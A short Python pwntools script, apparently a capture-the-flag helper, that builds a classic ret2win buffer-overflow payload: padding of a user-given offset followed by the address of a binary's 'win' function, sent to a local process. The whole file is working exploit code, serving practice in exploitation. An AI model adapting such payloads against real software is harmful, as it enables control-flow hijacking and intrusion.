from pwn import *

binary = input('Enter the binary name: ')
offset = int(input('Enter the offset: '))

exe = f'./{binary}'

elf = context.binary = ELF(exe)

win_addrs = elf.symbols["win"]

log.success(f'Found win() at: {hex(win_addrs)}')

p = process(exe)

OFFSET = offset

payload = b"A"*offset + p32(win_addrs)

p.sendline(payload)

print(p.recvall(timeout=2).decode())
